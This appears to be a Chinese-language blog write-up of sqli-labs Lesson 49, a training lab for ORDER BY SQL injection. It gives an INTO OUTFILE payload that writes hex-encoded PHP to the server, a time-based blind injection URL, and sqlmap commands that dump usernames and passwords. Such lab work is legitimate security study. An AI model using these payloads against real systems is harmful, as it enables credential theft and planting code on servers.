---
title: sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入
date: 2018-11-07 09:05:27
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-49/001.png)

## 分析

一旦遇上字符型,就不是那么好做了,尝试了几种构造方法,发现没有办法构造成布尔型的方式。那么只能采用盲注和into outfile上传。

## 注入

#### into outfile 注入

需要知道路径,使用方式为into outfield "path"加上`lines terminated by 16进制转码的数据`

`<?php phpinfo();?> 对应的16进制 3c3f70687020706870696e666f28293b3f3e2020`

![002](/img/sql/Lesson-49/002.png)

### 时间盲注

`http://10.60.250.142:8082/Less-49/?sort=1' and if((select length(database())=8), sleep(1), null)%23`



![003](/img/sql/Lesson-49/003.png)

有了payload接下来的就可以写个脚本来跑了。

## SQLMAP

`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 --flush-session --fresh-queries`

![004](/img/sql/Lesson-49/004.png)

盲注受网络环境影响较大,直接爆字段吧。

`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 -D security -T users -C username,password --dump  --flush-session --fresh-queries`

![005](/img/sql/Lesson-49/005.png)

![006](/img/sql/Lesson-49/006.png)

